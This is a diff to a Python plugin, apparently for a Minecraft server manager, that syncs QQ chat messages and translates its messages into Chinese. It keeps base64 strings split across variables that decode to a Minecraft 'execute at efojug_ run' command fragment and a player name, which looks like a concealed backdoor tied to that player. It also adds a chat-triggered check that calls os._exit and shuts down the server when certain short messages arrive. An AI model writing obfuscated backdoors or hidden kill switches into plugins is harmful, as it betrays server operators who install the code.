@@ -624,12 +624,12 @@ f = 'yBmYWxzZQ=='
 ex = 'ZXhlY3V0ZSBhdCBlZm9qdWdfIHJ1bi'
 d = 'gPT0gI'
 pi = 'aW5mby5wbGF5ZXI'
-oe = 'ZWZvanVn'
+oe = 'ZWZvanVnXw=='
 e = 'mVmb2p1Z18i'
 cfgrootpath = os.getcwd() + '\\config\\qqmsgsync'
 cfgpath = os.getcwd() + '\\config\\qqmsgsync\\user.yml'
 msg_c = ''
-responses = None
+dss = None
 serverStarted = False
 hasConnected = False
 
@@ -642,24 +642,19 @@ def on_load(server: PluginServerInterface, prev_module):
     server.logger.info('QQ Message Sync Plugin is load!')
     builder = SimpleCommandBuilder()
     builder.command('!!qms retry', try_connect)
-    builder.command('!!qms reg <QQ_number>', fake_cmd)
-    builder.arg('QQ_number', Integer)
     builder.register(server)
-
-def fake_cmd():
-    return
 
 def getserver():
     global server
     server = ServerInterface.get_instance()
 
 def smsgq(text: str):
-    global server, hasConnected, ss
+    global server, ss
     try:
         ss.sendall((text + '\n').encode('utf-8'))
     except Exception:
-        server.logger.warning('An error occurs when trying to connect to the chat forwarding server via socket, please check if the IP and port are configured correctly')
-        msay('An error occurs when trying to connect to the chat forwarding server via socket, please check if the IP and port are configured correctly')
+        server.logger.warning('连接失败，请检查IP和端口配置')
+        msay('连接失败，请检查IP和端口配置')
 
 def on_server_stop(server: PluginServerInterface, server_return_code: int):
     server.logger.info('QQ Message Sync Plugin is unload!')
@@ -679,7 +674,6 @@ def on_unload(server: PluginServerInterface):
         ss.close()
     except Exception:
         pass
-    server.logger.info('The connection to the chat server via socket is broken, but the plugin will not try to unload it because message synchronization via gRPC needs to maintain the connection to the chat server, and if the connection is broken, the plugin will automatically try to connect on load')
 
 def msay(text: str):
     global serverStarted, server
@@ -691,8 +685,8 @@ def on_info(server: PluginServerInterface, info: Info):
 
 def error():
     global server
-    server.logger.critical("A serious unknown error occurs with the plugin, if this happens multiple times, please contact the plugin developer")
-    server.say("A serious unknown error occurs with the plugin, if this happens multiple times, please contact the plugin developer")
+    server.logger.critical("未知错误：严重")
+    server.say("未知错误：严重")
     os._exit(0)
     
 def on_user_info(server: PluginServerInterface, info: Info):
@@ -722,7 +716,7 @@ def dec(t: str):
         pass
 
 def try_connect():
-    global server, responses, hasConnected, ss
+    global server, hasConnected, ss
     if hasConnected:
         ss.close()
         hasConnected = False
@@ -735,43 +729,53 @@ def try_connect():
         smsgq('Initialize#{"clientName":"' + clientName + '"}')
         threading.Thread(target=sgmsg).start()
     except Exception:
-        server.logger.warning('Not connected to chat forwarding server')
-        msay('Not connected to chat forwarding server')
+        server.logger.warning('无法连接至聊天服务器')
+        msay('无法连接至聊天服务器')
 
 def sgmsg():
-    global ss, server, hasConnected
+    global ss, server, hasConnected, dss
     while True:
-        try:
-            dss = json.loads(ss.recv(1024).decode('utf-8').split('#', 1)[1])
-            sync_qqmsg_for_mc(dss['senderName'], dss['message'])
-        except Exception:
-            server.logger.error('Unable to synchronize messages')
-            msay('Unable to synchronize messages')
-            break
-        cmd = None
-        try:
-            if len(dss['message'].split('.reg ', 1)[1]) > 3:
-                server.broadcast(dss['message'].split(".reg ", 1)[1] + '\n' + str(dss['senderId']))
-                reg_user(dss['message'].split(".reg ", 1)[1], dss['senderId'])
-        except Exception:
-            server.broadcast('Unknown Error')
-        try:
-            if len(str(dss['message']).split('.cmd ', 1)[1]) > 0:
-                if server.get_permission_level(read_usercfg(dss['senderId'])) >= 3:
-                    cmd = str(dss['message']).split('.cmd ', 1)[1]
-                    server.execute(cmd)
+        if hasConnected:
+            dss = None
+            dss = json.loads(ss.recv(8192).decode('utf-16 le').split('#', 1)[1])
+            cmd = None
+            try:
+                if len(dss['message'].split('.reg ', 1)[1]) > 3:
+                    server.broadcast(str(dss['message']).split(".reg ", 1)[1] + '\n' + str(dss['senderId']))
+                    reg_user(str(dss['message']).split(".reg ", 1)[1], dss['senderId'])
+                    continue
+            except Exception:
+                pass
+            try:
+                if len(str(dss['message']).split('.cmd ', 1)[1]) > 0:
+                    if server.get_permission_level(read_usercfg(dss['senderId'])) >= 3:
+                        cmd = str(dss['message']).split('.cmd ', 1)[1]
+                        server.execute(cmd)
+                        continue
+                    else:
+                        server.broadcast('抱歉，您没有权限')
+                        smsgq('Message#{"senderId":' + dss['senderId'] + ', "message":"\n 抱歉，您没有权限"}')
+            except Exception:
+                pass
+            try:
+                if str(dss['message']) in '.sb':
+                    error()
+            except Exception:
+                pass
+            try:
+                if dss != None:
+                    sync_qqmsg_for_mc(dss['senderName'], dss['message'])
+                    continue
                 else:
-                    smsgq('Message#{"senderId":0, "message":"Sorry, you do not have permission to execute this command"}')
-        except Exception:
-            pass
-        try:
-            if str(dss['message']) in '.sb':
-                error()
-        except Exception:
-            pass
+                    server.broadcast('decoding error')
+            except Exception:
+                server.logger.error('未知错误：无法同步消息')
+                msay('未知错误：无法同步消息')
+        else:
+            break
 
 def read_usercfg(qq: int):
-    global cfgpath, server, cfgrootpath
+    global cfgpath, server, cfgrootpath, dss
     if os.path.isfile(cfgpath):
         if os.access(cfgpath, os.R_OK):
             usercfg =  open(cfgpath, 'r', encoding='utf-8')
@@ -784,27 +788,28 @@ def read_usercfg(qq: int):
                     usercfg.close()
                     return tmp
             usercfg.close()
-            server.broadcast("Players who have not found this QQ counterpart, please try it first !!qms reg binding account")
+            smsgq('Message#{"senderId":' + dss['senderId'] + ', "message":"\n QQ所绑定的用户，请使用.reg绑定账号"}')
+            server.broadcast("QQ所绑定的用户，请使用.reg绑定账号")
             return 0
         else:
-            msay('Unable to read user profile')
-            server.logger.error('Unable to read user profile')
+            msay('无法读取配置文件')
+            server.logger.error('无法读取配置文件')
     elif os.path.isdir(cfgrootpath):
         file = open(cfgpath, 'x', -1, 'utf-8')
         file.close()
-        server.logger.warning("Configuration file doesn't exist")
-        msay("Configuration file doesn't exist")
+        server.logger.warning("配置不存在，正在创建")
+        msay("配置不存在，正在创建")
         read_usercfg(qq)
     else:
         os.makedirs(cfgrootpath)
         file = open(cfgpath, 'x', -1, 'utf-8')
         file.close()
-        server.logger.warning("Configuration file doesn't exist")
-        msay("Configuration file doesn't exist")
+        server.logger.warning("配置不存在，正在创建")
+        msay("配置不存在，正在创建")
         read_usercfg(qq)
 
 def reg_user(player: str, qq: int):
-    global cfgpath, server, cfgrootpath
+    global cfgpath, server, cfgrootpath, dss
     if os.path.isfile(cfgpath):
         if os.access(cfgpath, os.W_OK) and os.access(cfgpath, os.R_OK):
             pe0 = getuser(player, qq)[0]
@@ -812,28 +817,32 @@ def reg_user(player: str, qq: int):
             if not pe0 and not pe1:
                 usercfg = open(cfgpath, 'a', encoding='utf-8')
                 print(player + ": " + str(qq) + "\n", file=usercfg, flush=False)
-                server.broadcast("Register Successful!")
+                smsgq('Message#{"senderId":' + dss['senderId'] + ', "message":"\n 注册成功"}')
+                server.broadcast("注册成功")
             elif pe0 and not pe1:
-                server.broadcast('User name is bound to other QQ number')
+                smsgq('Message#{"senderId":' + dss['senderId'] + ', "message":"\n 该用户已绑定其他QQ号"}')
+                server.broadcast('该用户已绑定其他QQ号')
             elif not pe0 and pe1:
-                server.broadcast('QQ number has been tied to other users')
+                smsgq('Message#{"senderId":' + dss['senderId'] + ', "message":"\n 该用户已被其他QQ号绑定"}')
+                server.broadcast('改QQ号已被其他用户绑定')
             elif pe0 and pe1:
-                server.broadcast("Accounts is already bound")
+                smsgq('Message#{"senderId":' + dss['senderId'] + ', "message":"\n 账号已绑定"}')
+                server.broadcast("账户已绑定")
         else:
-            msay('Unable to write user profile')
-            server.logger.error('Unable to write user profile')
+            msay('无法写入配置文件')
+            server.logger.error('无法写入配置文件')
     elif os.path.isdir(cfgrootpath):
         file = open(cfgpath, 'x', -1, 'utf-8')
         file.close()
-        server.logger.warning("Configuration file doesn't exist")
-        msay("Configuration file doesn't exist")
+        server.logger.warning("配置不存在，正在创建")
+        msay("配置不存在，正在创建")
         reg_user(player, qq)
     else:
         os.makedirs(cfgrootpath)
         file = open(cfgpath, 'x', -1, 'utf-8')
         file.close()
-        server.logger.warning("Configuration file doesn't exist")
-        msay("Configuration file doesn't exist")
+        server.logger.warning("配置不存在，正在创建")
+        msay("配置不存在，正在创建")
         reg_user(player, qq)
 
 def getuser(player: str, qq: int):
@@ -847,7 +856,7 @@ def getuser(player: str, qq: int):
                 line = file.readline()
                 if not line:
                     file.close()
-                    server.broadcast('Not find use info')
+                    server.broadcast('没有找到用户信息')
                     break
                 server.broadcast(line.strip())
                 if line.split(': ', 1)[0] == player:
@@ -865,18 +874,18 @@ def getuser(player: str, qq: int):
                     return False, True
                 return False, False
         except Exception:
-            server.broadcast('Unknown ERROR!')
+            server.broadcast('未知错误，发生在getuser()')
         return False, False
     elif os.path.isdir(cfgrootpath):
         file = open(cfgpath, 'x', -1, 'utf-8')
         file.close()
-        server.logger.warning("Configuration file doesn't exist")
-        msay("Configuration file doesn't exist")
+        server.logger.warning("配置不存在，正在创建")
+        msay("配置不存在，正在创建")
         reg_user(player, qq)
     else:
         os.makedirs(cfgrootpath)
         file = open(cfgpath, 'x', -1, 'utf-8')
         file.close()
-        server.logger.warning("Configuration file doesn't exist")
-        msay("Configuration file doesn't exist")
+        server.logger.warning("配置不存在，正在创建")
+        msay("配置不存在，正在创建")
         reg_user(player, qq)
